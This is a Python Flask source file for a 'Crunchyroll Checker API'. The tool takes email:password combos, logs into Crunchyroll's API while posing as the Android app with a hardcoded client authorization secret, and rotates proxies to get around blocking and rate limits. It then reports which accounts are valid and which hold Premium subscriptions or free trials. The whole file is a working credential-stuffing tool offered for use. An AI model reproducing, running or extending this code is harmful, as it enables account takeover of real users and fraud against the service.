from flask import Flask, request, jsonify
import requests
from urllib.parse import quote
from datetime import datetime

app = Flask(__name__)

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/123.0 Safari/537.36"

def escape_html(text):
    return (
        text.replace('&', '&amp;')
            .replace('<', '&lt;')
            .replace('>', '&gt;')
    )

def translate_sku_to_plan(sku, amount, cycle_duration):
    if not sku or sku == "N/A":
        if amount and amount != "N/A" and float(amount) > 0:
            if cycle_duration == "P1M":
                if float(amount) <= 7.99:
                    return "Fan"
                elif float(amount) <= 9.99:
                    return "Mega Fan"
                elif float(amount) <= 15.99:
                    return "Ultimate Fan"
            elif cycle_duration == "P1Y":
                return "Annual " + ("Fan" if float(amount) <= 79.99 else "Mega Fan" if float(amount) <= 99.99 else "Ultimate Fan")
        return "Free"
    sku = sku.lower()
    plan_mapping = {
        "fan": "Fan",
        "mega": "Mega Fan",
        "ultimate": "Ultimate Fan",
        "premium": "Premium",
        "free": "Free"
    }
    for key, value in plan_mapping.items():
        if key in sku:
            return value
    return sku

def get_remaining_days(expiry_date_str):
    try:
        expiry_date = datetime.strptime(expiry_date_str, "%Y-%m-%d")
        today = datetime.now()
        remaining_delta = expiry_date - today
        return max(0, remaining_delta.days)
    except Exception:
        return "N/A"

def format_proxy(proxy_string):
    if not proxy_string:
        return None
    if "@" in proxy_string:
        if not proxy_string.startswith("http"):
            proxy_string = "http://" + proxy_string
        return {
            "http": proxy_string,
            "https": proxy_string
        }
    parts = proxy_string.split(":")
    if len(parts) == 4:
        ip, port, user, pwd = parts
        pstr = f"http://{user}:{pwd}@{ip}:{port}"
        return {"http": pstr, "https": pstr}
    elif len(parts) == 2:
        ip, port = parts
        pstr = f"http://{ip}:{port}"
        return {"http": pstr, "https": pstr}
    return None

def crunchyroll_check(email, password, proxy=None):
    session = requests.Session()
    proxies = format_proxy(proxy) if proxy else None

    username = "N/A"
    user_id = "N/A"
    external_id = "N/A"
    country = "N/A"
    plan = "Free"
    currency = "N/A"
    paid_amount = "N/A"
    expiry_date = "N/A"
    remaining_days = "N/A"
    subscription_status = "Free"
    free_trial = "No"
    cycle_duration = "N/A"
    benefits_total = 0

    common_headers = {
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "x-datadog-sampling-priority": "0",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
        "Referer": "https://www.crunchyroll.com/",
        "Origin": "https://www.crunchyroll.com/",
    }
    auth_request_headers = {
        **common_headers,
        "User-Agent": "Crunchyroll/3.78.3 Android/9 okhttp/4.12.0",
        "Authorization": "Basic bWZsbzhqeHF1cTFxeWJwdmY3cXA6VEFlTU9SRDBGRFhpdGMtd0l6TVVfWmJORVRRT2pXWXg=",
        "Content-Type": "application/x-www-form-urlencoded",
        "Host": "beta-api.crunchyroll.com",
        "ETP-Anonymous-ID": "ccdcc444-f39c-48c3-9aa1-f72ebb93dfb1",
    }
    data = f"username={quote(email)}&password={quote(password)}&grant_type=password&scope=offline_access&device_id=14427c33-1893-4bc5-aaf3-dea072be2831&device_type=Chrome%20on%20Android"

    try:
        res = session.post("https://beta-api.crunchyroll.com/auth/v1/token", headers=auth_request_headers, data=data, proxies=proxies, timeout=15)
        if res.status_code in [403, 429, 500, 502, 503]:
            return email, password, "Blocked/RateLimited by Crunchyroll/Proxy."
        if "invalid_credentials" in res.text:
            return email, password, "Invalid or Free Account."

        try:
            json_res = res.json()
        except Exception:
            return email, password, "Crunchyroll sent invalid JSON at login."

        token = json_res.get("access_token")
        if not token or json_res.get("error") or json_res.get("unsupported_grant_type"):
            return email, password, "Invalid or Free Account."

        auth_headers_subsequent = {
            **common_headers,
            "Authorization": f"Bearer {token}",
            "User-Agent": UA,
            "Host": "beta-api.crunchyroll.com",
            "sec-ch-ua": "\"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "etp-anonymous-id": "64a91812-bb46-40ad-89ca-ff8bb567243d",
        }

        acc_res = session.get("https://beta-api.crunchyroll.com/accounts/v1/me", headers=auth_headers_subsequent, proxies=proxies, timeout=10)
        if acc_res.status_code == 200:
            try:
                acc = acc_res.json()
                user_id = acc.get("account_id", "N/A")
                external_id = acc.get("external_id", "N/A")
            except Exception:
                pass

        # Check Benefits (to get country and benefits_total)
        if external_id != "N/A":
            benefits_res = session.get(f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits", headers=auth_headers_subsequent, proxies=proxies, timeout=10)
            if benefits_res.status_code == 200:
                benefits_json = benefits_res.json()
                benefits_total = benefits_json.get("total", 0)
                country = benefits_json.get("subscription_country", "N/A")
                if benefits_total > 0:
                    subscription_status = "Active"
                else:
                    subscription_status = "Free"

        # subs/v3/subscriptions (plan, paid, currency)
        if user_id != "N/A":
            sub_v3_res = session.get(f"https://beta-api.crunchyroll.com/subs/v3/subscriptions/{user_id}", headers=auth_headers_subsequent, proxies=proxies, timeout=10)
            if sub_v3_res.status_code == 200:
                sub_v3_json = sub_v3_res.json()
                subscription_products = sub_v3_json.get("subscription_products", [])
                sku = "N/A"
                paid_amount = "N/A"
                currency = sub_v3_json.get("currency_code", "N/A")
                cycle_duration = sub_v3_json.get("cycle_duration", "N/A")
                if subscription_products:
                    product = subscription_products[0]
                    sku = product.get("sku") or product.get("subscription_sku") or product.get("plan_id", "N/A")
                    paid_amount = str(product.get("amount", "N/A"))
                    currency = product.get("currency_code", currency)
                else:
                    sku = sub_v3_json.get("sku") or sub_v3_json.get("subscription_sku") or sub_v3_json.get("plan_id", "N/A")
                    paid_amount = str(sub_v3_json.get("amount", "N/A"))
                plan = translate_sku_to_plan(sku, paid_amount, cycle_duration)

        # subs/v1/subscriptions (expiry, trial)
        if external_id != "N/A":
            sub_v1_res = session.get(f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}", headers=auth_headers_subsequent, proxies=proxies, timeout=10)
            if sub_v1_res.status_code == 200:
                sub_v1_json = sub_v1_res.json()
                if sub_v1_json.get("has_free_trial", False) and subscription_status != "Active":
                    free_trial = "Yes"

        if free_trial == "Yes":
            return email, password, "Free Trial Account"
        elif subscription_status == "Active" or (plan != "Free" and plan != "N/A"):
            return email, password, "Premium Account"
        else:
            return email, password, "Invalid or Free Account"
    except Exception as ex:
        return email, password, f"Unknown Error: {ex}"

@app.route("/check", methods=["GET", "POST"])
def check():
    combo = request.values.get("email", "").strip()
    proxy = request.values.get("proxy", "")

    if ":" not in combo or not combo:
        return jsonify({"status": "error", "message": "Use ?email=email:pass&proxy=proxy (proxy optional)"}), 400
    email, password = combo.split(":", 1)
    if not email or not password:
        return jsonify({"status": "error", "message": "Missing email or password"}), 400

    email, password, message = crunchyroll_check(email, password, proxy if proxy else None)
    return jsonify({"email": email, "pass": password, "message": message})

@app.route("/")
def home():
    return "<h3>Crunchyroll Checker API<br>Use /check?email=email:pass&proxy=proxy</h3>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
